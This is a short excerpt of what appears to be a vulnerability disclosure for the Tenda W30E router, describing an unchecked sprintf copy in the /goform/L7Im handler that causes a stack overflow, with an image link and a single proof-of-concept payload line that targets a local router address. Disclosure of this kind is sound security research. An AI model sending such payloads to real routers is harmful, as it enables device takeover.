...
![](https://github.com/z1r00/IOT_Vul/blob/main/Tenda/W30E/L7Im/img/2.png)

In /goform/L7Im, the page will be spliced into s by sprintf. It is worth noting that there is no size check, which leads to a stack overflow vulnerability.
...
payload = b"http://192.168.10.103/goform/L7Im/?" + cmd
